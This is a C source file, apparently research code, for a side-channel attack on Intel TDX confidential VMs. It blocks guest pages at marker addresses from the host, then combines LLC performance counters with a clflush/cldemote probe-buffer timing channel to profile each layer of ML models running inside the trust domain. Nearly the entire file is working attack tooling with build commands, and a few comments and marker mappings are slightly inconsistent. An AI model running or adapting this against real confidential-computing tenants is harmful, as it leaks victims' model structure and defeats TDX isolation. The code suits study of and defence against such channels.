// 2-cldemote-attack.c
//
// Extended page-fault attack that adds a cldemote-based timing channel
// on top of the existing LLC counter approach.
//
// ATTACK OVERVIEW
// ---------------
// The existing code (1-page-table-attack.c) blocks marker pages in the TD
// and reads LLC counters between START/END marker pairs. That gives aggregate
// cache traffic per layer but misses compute-bound layers that stay in L1/L2.
//
// This extension adds a Demote+Reload / DemoteContention inspired channel:
//
//   Before layer runs  (START marker fires):
//     - Flush the probe buffer from all caches with clflush.
//     - Then immediately demote the same lines back to L3 with cldemote
//       (or skip the demote step if cldemote is unavailable — see below).
//     - Record a baseline probe-access time (cold L3 read latency).
//     - Resume the TD.
//
//   Victim executes the layer:
//     - GEMM kernels generate L3 spills when weight matrices exceed L2.
//     - Those spills create contention on the L3 cache sets/directory.
//
//   After layer completes (END marker fires):
//     - Measure probe-buffer access latency again with rdtsc.
//     - If the victim's layer caused significant L3 pressure, some of the
//       attacker's probe lines will have been evicted from L3, making the
//       reload slower than baseline.
//     - The delta (post_cycles - baseline_cycles) is the contention signal.
//
// HARDWARE NOTE
// -------------
// cldemote (opcode 0F 1C /0) is only supported on Intel Xeon Sapphire Rapids
// and Emerald Rapids. On Alder Lake / Raptor Lake it is treated as a NOP that
// still performs a TLB lookup. If your CPU does not support cldemote, the code
// falls back to clflush-only mode (HAVE_CLDEMOTE=0 at compile time), which
// gives a cruder but still useful Flush+Reload signal.
//
// Build:
//   With cldemote:    gcc -O2 -DHAVE_CLDEMOTE=1 -o attack 2-cldemote-attack.c
//   Without cldemote: gcc -O2 -DHAVE_CLDEMOTE=0 -o attack 2-cldemote-attack.c

#ifndef HAVE_CLDEMOTE
#define HAVE_CLDEMOTE 0
#endif

#include <linux/perf_event.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <poll.h>
#include "../tdxutils/tdxutils.h"
#include <time.h>
#include <stdint.h>
#include <string.h>

#define CRESET "\033[39m"
#define CGRN   "\033[92m"
#define CCYN   "\033[96m"
#define CYEL   "\033[93m"

// ---------------------------------------------------------------------------
// Probe buffer parameters.
//
// We use a 4 MB probe buffer strided at cache-line granularity. This is large
// enough to occupy a meaningful fraction of the L3 (typically 8-32 MB on
// Xeon), so victim-induced evictions are detectable, but small enough that
// iterating over it takes < 1 ms and does not itself disturb the measurement.
//
// PROBE_REPEATS: how many passes to make during the latency measurement.
// More repeats = lower noise but longer measurement window.  Keep at 1 during
// the layer window (we measure once right after END fires) — the victim is
// paused at the marker so there is no race.
// ---------------------------------------------------------------------------
#define PROBE_SIZE     (4 * 1024 * 1024)
#define CACHE_LINE     64
#define PROBE_STRIDE   CACHE_LINE
#define PROBE_REPEATS  3

static unsigned char *probe_buf;

// ---------------------------------------------------------------------------
// State for the START/END pairing logic.
// ---------------------------------------------------------------------------
static int    expected_end_idx = -1;
static int    counter_active   = 0;
static int    llc_refs_fd      = -1;
static int    llc_misses_fd    = -1;

// Baseline probe latency sampled right after flushing/demoting at START time,
// before the TD is resumed.  The post-layer measurement is compared against
// this so that we report a delta rather than an absolute cycle count (which
// would vary with CPU frequency).
static uint64_t baseline_probe_cycles = 0;

// ---------------------------------------------------------------------------
// Low-level helpers
// ---------------------------------------------------------------------------

static inline uint64_t rdtsc(void) {
    unsigned int lo, hi;
    // rdtscp serialises against prior loads/stores and writes the TSC into
    // lo:hi. We use it (rather than rdtsc) so that out-of-order execution
    // does not let the counter read retire before the probe loads above it.
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "rcx");
    return ((uint64_t)hi << 32) | lo;
}

static inline void mfence_all(void) {
    asm volatile("mfence" ::: "memory");
}

static inline void lfence(void) {
    asm volatile("lfence" ::: "memory");
}

// Flush a single cache line from all cache levels (including L3).
static inline void clflush_line(void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

// Demote a cache line from L1/L2 down to L3 without a full eviction.
// On CPUs that do not support cldemote the instruction is a NOP but we still
// emit it so the binary is identical — the compiler guards above handle the
// fallback path at the higher level.
#if HAVE_CLDEMOTE
static inline void cldemote_line(void *p) {
    // CLDEMOTE r/m8 — opcode 0F 1C /0
    // GCC does not have a built-in for this yet; emit via .byte.
    asm volatile(".byte 0x0f, 0x1c, 0x07" :: "D"(p) : "memory");
}
#else
// On non-Sapphire-Rapids hardware fall back to clflush.  The effect is a
// full eviction rather than a demotion to L3, giving a Flush+Reload signal
// instead of Demote+Reload.  The contention delta is still meaningful.
static inline void cldemote_line(void *p) {
    clflush_line(p);
}
#endif

// ---------------------------------------------------------------------------
// Probe buffer lifecycle
// ---------------------------------------------------------------------------

static void init_probe_buffer(void) {
    probe_buf = aligned_alloc(CACHE_LINE, PROBE_SIZE);
    if (!probe_buf) {
        perror("aligned_alloc");
        exit(EXIT_FAILURE);
    }
    // Write to every cache line so the pages are faulted in and resident.
    memset(probe_buf, 0xAB, PROBE_SIZE);
    // Warm up: one full pass to bring everything into cache.
    volatile unsigned long sum = 0;
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
        sum += probe_buf[i];
    mfence_all();
    (void)sum;
}

// Step 1 of Demote+Reload: evict all probe lines from cache, then
// immediately demote them back to L3 (or leave them evicted in fallback mode).
// Called at START marker, before the TD is resumed.
static void prepare_probe_buffer(void) {
    // First flush everything out.
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
        clflush_line(&probe_buf[i]);
    mfence_all();

#if HAVE_CLDEMOTE
    // Access each line to bring it back into L1, then immediately demote to
    // L3.  This leaves probe lines in L3 (warm for L3, cold for L1/L2),
    // mirroring the Demote+Reload setup: the next read will come from L3
    // unless the victim evicted it.
    volatile unsigned long sum = 0;
    for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE) {
        sum += probe_buf[i];                    // bring to L1
        cldemote_line(&probe_buf[i]);           // push back to L3
    }
    mfence_all();
    (void)sum;
#endif
    // In fallback mode the lines are simply flushed; the victim's activity
    // will determine how many remain absent when we probe after END.
}

// Step 2: measure how long it takes to read the entire probe buffer.
// Lines that were evicted by the victim will incur L3 misses (or DRAM
// accesses), inflating this number relative to the baseline.
static uint64_t measure_probe_cycles(void) {
    volatile unsigned long sum = 0;
    uint64_t start, end;

    lfence();
    mfence_all();
    start = rdtsc();

    for (int r = 0; r < PROBE_REPEATS; r++) {
        for (size_t i = 0; i < PROBE_SIZE; i += PROBE_STRIDE)
            sum += probe_buf[i];
    }

    mfence_all();
    end = rdtsc();
    (void)sum;

    return end - start;
}

// ---------------------------------------------------------------------------
// perf_event LLC counters (unchanged from original attack)
// ---------------------------------------------------------------------------

static long perf_event_open_counter(struct perf_event_attr *hw_event,
                                    pid_t pid, int cpu, int group_fd,
                                    unsigned long flags) {
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

static int open_llc_counter(uint64_t op, uint64_t result) {
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(struct perf_event_attr));
    pe.type        = PERF_TYPE_HW_CACHE;
    pe.size        = sizeof(struct perf_event_attr);
    pe.config      = PERF_COUNT_HW_CACHE_LL | (op << 8) | (result << 16);
    pe.disabled    = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv     = 0;

    int fd = perf_event_open_counter(&pe, -1, 2, -1, 0);
    if (fd == -1) {
        perror("perf_event_open");
        return -1;
    }
    return fd;
}

static void init_perf_counters(void) {
    llc_refs_fd = open_llc_counter(PERF_COUNT_HW_CACHE_OP_READ,
                                   PERF_COUNT_HW_CACHE_RESULT_ACCESS);
    llc_misses_fd = open_llc_counter(PERF_COUNT_HW_CACHE_OP_READ,
                                     PERF_COUNT_HW_CACHE_RESULT_MISS);
    if (llc_refs_fd == -1 || llc_misses_fd == -1) {
        fprintf(stderr, "Could not open LLC hardware counters\n");
        exit(EXIT_FAILURE);
    }
}

static void reset_start_counters(void) {
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_RESET,   0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_RESET,   0);
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_ENABLE,  0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_ENABLE,  0);
    counter_active = 1;
}

static void stop_read_counters(uint64_t *llc_refs, uint64_t *llc_misses) {
    ioctl(llc_refs_fd,   PERF_EVENT_IOC_DISABLE, 0);
    ioctl(llc_misses_fd, PERF_EVENT_IOC_DISABLE, 0);
    ssize_t ret;
    ret = read(llc_refs_fd,   llc_refs,   sizeof(uint64_t));
    if (ret != sizeof(uint64_t)) perror("read llc_refs");
    ret = read(llc_misses_fd, llc_misses, sizeof(uint64_t));
    if (ret != sizeof(uint64_t)) perror("read llc_misses");
}

// ---------------------------------------------------------------------------
// Timing helper
// ---------------------------------------------------------------------------

static unsigned long long now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
    return ((unsigned long long)ts.tv_sec * 1000000000ULL) + ts.tv_nsec;
}

// ---------------------------------------------------------------------------
// TDX / GPA helpers (unchanged)
// ---------------------------------------------------------------------------

static unsigned char get_gpa_level(int util_fd, unsigned long gpa,
                                   unsigned long tdr_pa) {
    union tdx_sept_entry entry;
    unsigned long rc;
    rc = seamcall_tdh_mem_sept_rd(util_fd, 1,
                                  gpa & ~((1ul << 21) - 1),
                                  tdr_pa, (void *)&entry, NULL);
    if (rc != TDX_SUCCESS) {
        fprintf(stderr, "Error: could not resolve GPA 0x%lx\n", gpa);
        exit(EXIT_FAILURE);
    }
    return entry.leaf ? 1 : 0;
}

static int block_single_gpa(int util_fd, unsigned long gpa,
                             unsigned long tdr_pa) {
    unsigned char level = get_gpa_level(util_fd, gpa, tdr_pa);
    struct tdx_gpa_range range = {
        .start   = level_align(gpa, level),
        .end     = level_align(gpa, level) + level_pg_size(level),
        .tdr_pa  = tdr_pa,
        .level   = level,
    };
    return ioctl(util_fd, IOCTL_TDX_BLOCK_GPA_RANGE, &range);
}

static int same_2mb_page(unsigned long a, unsigned long b) {
    return (a & ~((1ul << 21) - 1)) == (b & ~((1ul << 21) - 1));
}

// ---------------------------------------------------------------------------
// Marker name tables (unchanged)
// ---------------------------------------------------------------------------

static const char *marker_name(const char *model, int idx) {
    if (strcmp(model, "mlp") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "L1_START";
            case 2: return "L1_END";
            case 3: return "L2_START";
            case 4: return "L2_END";
            case 5: return "L3_START";
            case 6: return "L3_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "cnn") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "CONV_START";
            case 2: return "CONV_END";
            case 3: return "POOL_START";
            case 4: return "POOL_END";
            case 5: return "FC1_START";
            case 6: return "FC1_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "resnet") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "BLOCK1_START";
            case 2: return "BLOCK1_END";
            case 3: return "BLOCK2_START";
            case 4: return "BLOCK2_END";
            case 5: return "CLASSIFIER_START";
            case 6: return "CLASSIFIER_END";
            case 7: return "TERM";
            default: return "UNKNOWN";
        }
    }
    if (strcmp(model, "transformer") == 0) {
        switch (idx) {
            case 0: return "INF_START";
            case 1: return "QKV_START";
            case 2: return "QKV_END";
            case 3: return "ATTENTION_START";
            case 4: return "ATTENTION_END";
            case 5: return "FFN_START";
            case 6: return "FFN_END";
            case 7: return "CLASSIFIER_START";
            case 8: return "CLASSIFIER_END";
            case 9: return "TERM";
            default: return "UNKNOWN";
        }
    }
    return "UNKNOWN";
}

static int find_marker(unsigned long accessed, unsigned long *gpa,
                       int num_gpas) {
    for (int i = 0; i < num_gpas; i++) {
        if (same_2mb_page(accessed, gpa[i]))
            return i;
    }
    return -1;
}

static int is_start_marker(int idx) {
    return idx == 1 || idx == 3 || idx == 5 || idx == 7;
}

static int is_end_marker(int idx) {
    return idx == 2 || idx == 4 || idx == 6 || idx == 8;
}

static int matching_end_marker(int start_idx) {
    if (start_idx == 1) return 2;
    if (start_idx == 3) return 4;
    if (start_idx == 5) return 6;
    if (start_idx == 7) return 8;
    return -1;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

int main(int argc, char *argv[]) {
    struct pollfd pfd;
    unsigned long access_counter = 0, address_accessed = 0;
    unsigned long long start_ns = 0, last_ns = 0, current_ns = 0;
    unsigned long tdr_pa;
    int util_fd, status;

    if (argc < 3) {
        fprintf(stderr,
            "Usage: %s <model> <GPA1> <GPA2> ...\n"
            "Models: mlp, cnn, resnet, transformer\n",
            argv[0]);
        exit(EXIT_SUCCESS);
    }

    const char *model = argv[1];
    int num_gpas = argc - 2;

    unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
    if (!gpa) { perror("malloc"); exit(EXIT_FAILURE); }

    for (int i = 0; i < num_gpas; i++) {
        char *endptr = NULL;
        gpa[i] = strtoul(argv[i + 2], &endptr, 0);
        if (*endptr != '\0') {
            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 2]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
    }

    init_probe_buffer();
    init_perf_counters();

    util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) { perror("open"); exit(EXIT_FAILURE); }

    tdr_pa = get_tdr_pa(util_fd);

    // Drain any stale events.
    while (read(util_fd, &address_accessed, sizeof(address_accessed)) > 0) {}

    for (int i = 0; i < num_gpas; i++) {
        if (block_single_gpa(util_fd, gpa[i], tdr_pa) < 0) {
            perror("ioctl");
            fprintf(stderr, "Could not block GPA 0x%lx\n", gpa[i]);
            free(gpa);
            exit(EXIT_FAILURE);
        }
        printf("Blocked %s page GPA 0x%lx\n",
               get_gpa_level(util_fd, gpa[i], tdr_pa) ? "2MB" : "4kB",
               gpa[i]);
    }

    start_ns = now_ns();
    last_ns  = start_ns;

    // Column header — wider than original to fit new fields.
    printf("\n" CGRN
           "%-8s %-16s %-16s %-14s %-20s "
           "%-14s %-14s %-14s %-14s"
           CRESET "\n",
           "count", "time_ns", "delta_ns", "gpa", "marker",
           "llc_refs", "llc_misses",
           "baseline_cyc",   // probe latency measured at START (before victim runs)
           "post_cyc"        // probe latency measured at END (after victim ran)
           );

    pfd = (struct pollfd){ .fd = util_fd, .events = POLLIN };

    do {
        status = poll(&pfd, 1, 250);
        if (status <= 0)
            continue;

        status = read(util_fd, &address_accessed, sizeof(address_accessed));
        if (status <= 0)
            continue;

        current_ns = now_ns();

        int idx        = find_marker(address_accessed, gpa, num_gpas);
        const char *name = marker_name(model, idx);

        uint64_t llc_refs    = 0;
        uint64_t llc_misses  = 0;
        uint64_t post_cycles = 0;

        if (is_start_marker(idx)) {
            // ---------------------------------------------------------------
            // START path: set up probe buffer, record baseline, then let LLC
            // counters run while the victim executes the layer.
            // ---------------------------------------------------------------

            // 1. Prepare probe: flush from L1/L2, demote/re-seat to L3.
            //    The victim's layer has not run yet, so this is our clean
            //    baseline state.
            prepare_probe_buffer();

            // 2. Measure baseline probe latency (L3 hit latency in Demote
            //    mode, or cold-miss latency in clflush fallback mode).
            //    We do this before re-enabling the LLC counters so that our
            //    own probe reads are excluded from the layer measurement.
            baseline_probe_cycles = measure_probe_cycles();

            // 3. Now start LLC counters and record which END to expect.
            reset_start_counters();
            expected_end_idx = matching_end_marker(idx);
        }

        if (is_end_marker(idx) && counter_active) {
            // ---------------------------------------------------------------
            // END path: the victim has just touched the END marker and is
            // now paused (page fault).  Measure how the victim's layer
            // affected our probe buffer's cache residency.
            // ---------------------------------------------------------------

            // 1. Stop LLC counters first so our probe reads are not counted.
            stop_read_counters(&llc_refs, &llc_misses);
            counter_active   = 0;
            expected_end_idx = -1;

            // 2. Measure post-layer probe latency.
            //    In Demote+Reload mode: lines that were in L3 before the
            //    victim ran will have been evicted if the victim caused
            //    sufficient L3 set contention.  Those lines now require a
            //    DRAM fetch, inflating post_cycles relative to baseline.
            //    In clflush fallback mode: lines were absent from cache at
            //    baseline too, so post_cycles measures whether the victim's
            //    own activity happened to warm any of the same cache sets.
            post_cycles = measure_probe_cycles();
        }

        // Print one row per marker event.  For START markers, post_cycles
        // is 0 (it has not been measured yet).  For END markers,
        // baseline_probe_cycles holds the value from the matching START.
        printf(CGRN
               "%-8lu %-16llu %-16llu 0x%012lx %-20s "
               "%-14lu %-14lu %-14lu %-14lu"
               CRESET "\n",
               access_counter,
               current_ns - start_ns,
               current_ns - last_ns,
               address_accessed,
               name,
               llc_refs,
               llc_misses,
               (unsigned long)baseline_probe_cycles,
               (unsigned long)post_cycles);

        last_ns = current_ns;

        if (block_single_gpa(util_fd, address_accessed, tdr_pa) < 0)
            break;

        access_counter++;

    } while (status >= 0);

    printf("\nStopping.\n");

    if (status < 0) {
        perror("poll/ioctl");
        exit(EXIT_FAILURE);
    }

    free(gpa);
    return 0;
}
